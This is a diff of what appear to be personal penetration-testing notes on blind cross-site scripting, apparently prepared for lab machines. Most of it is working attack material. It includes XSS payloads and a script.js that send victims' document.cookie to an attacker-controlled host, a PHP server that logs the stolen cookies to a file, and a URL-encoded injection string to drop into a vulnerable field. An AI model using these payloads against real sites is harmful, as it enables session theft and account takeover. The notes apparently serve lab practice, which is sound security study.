@@ -109,9 +109,8 @@ append()
 <img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
 ```
 ## Blind XSS
-1) `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:8080`
-2) Find Vulnerable Parameter
-	1) Consider using Burp Intruder with URL Payload Processing!
+1) `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:PORT`
+2) Find Vulnerable Parameter (Burp Intruder with URL Payload Processing to encode if needed)
 *Examples of Blind XSS Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss*
 ```html
 <!-- Examples to try (put into burp payload positions) -->
@@ -130,26 +129,36 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP:
 <script src=http://OUR_IP:PORT/imgurl></script> #this goes inside the imgurl field
 ```
 
-1) Create `script.js` to POST cookie
+3) Create `script.js` to POST cookie
 
 ```javascript
-new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
+new Image().src='http://10.10.14.82:8767/index.php?c='+document.cookie;
+// or
+document.location='http://10.10.14.82:8767/index.php?c='+document.cookie;
 ```
 
-3) Start PHP server. 
-
-```shell
-php -S 0.0.0.0:80
+4) Start PHP server, two methods. 
+	1) Simple: `php -S 0.0.0.0:8767`
+	2) Script to log cookies, save as `index.php`, then run `php -S 0.0.0.0:8767:
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['VICTIM_IP']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+// replace Victim IP with target IP of web server
 ```
 
-4) Use `script src=` in vulnerable parameter
+5) Send the XSS payload in the vulnerable field discovered in step 1 `script src=` in vulnerable parameter, e.g.:
 
 ```javascript
-"><script src=http://10.10.16.33/script.js></script>
-```
-
-```javascript
-document.location='http://OUR_IP/index.php?c='+document.cookie;
+field3="><script+src%3dhttp%3a//10.10.14.82%3a8767/script.js></script>
 ```
 
 
